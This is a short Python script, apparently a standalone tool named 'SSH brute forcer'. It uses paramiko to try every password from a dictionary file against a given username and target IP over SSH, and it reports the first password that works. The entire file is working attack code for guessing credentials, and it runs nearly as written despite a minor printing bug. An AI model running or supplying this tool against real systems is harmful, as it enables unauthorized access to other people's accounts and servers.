import paramiko, sys, os, socket, termcolor, argparse


def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
    """Returns response code (int) 0:success, 1:authError, 2:connectionError"""
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try :
        # port 22 is set default in paramiko, declared explicitly for clarity
        ssh_client.connect(hostname=host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
        termcolor.cprint(f'[!] Password: {password} incorrect for user: {username} ','red')
    except socket.error as e:
        code = 2
        termcolor.cprint(e, "red")

    ssh_client.close()
    return code


def main(arguments):
    host = arguments.target_ip
    username = arguments.username
    input_file = arguments.path

    if not os.path.exists(input_file):
        print("No dict file found")
        sys.exit(1)
    else:
        with open(input_file, 'r') as file:
            for line in file.readlines():
                password = line.strip("\n")
                termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password: {password}', "yellow")
                response = ssh_connect(username, password, host)
                match response:
                    case 0:
                        termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green')
                        # on success break loop, no need to keep trying
                        break
                    case 1:
                        termcolor.cprint(f'[-] Credentials {username}:{password} incorrect', 'yellow')
                    case 2:
                        termcolor.cprint((f'[!] Cannot connect to socket', 'red'))


def get_arguments():
    parser = argparse.ArgumentParser(prog='SSH brute forcer')
    parser.add_argument('-t', dest='target_ip', help='IP of the desired target', required=True)
    parser.add_argument('-u', dest='username', help='Username on target', required=True)
    parser.add_argument('-p', dest='path', help='Path to dictionary file', required=True)

    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[!] Introduce target's IPV4")
    elif not options.username:
        parser.error("[!] Introduce target SSH username")
    elif not options.path:
        parser.error("[!] Introduce path to file")

    return options


if __name__ == "__main__":
    try:
        cli_args = get_arguments()
        main(cli_args)
    except:
        termcolor.cprint("[!] Something went wrong, exiting...", "red")




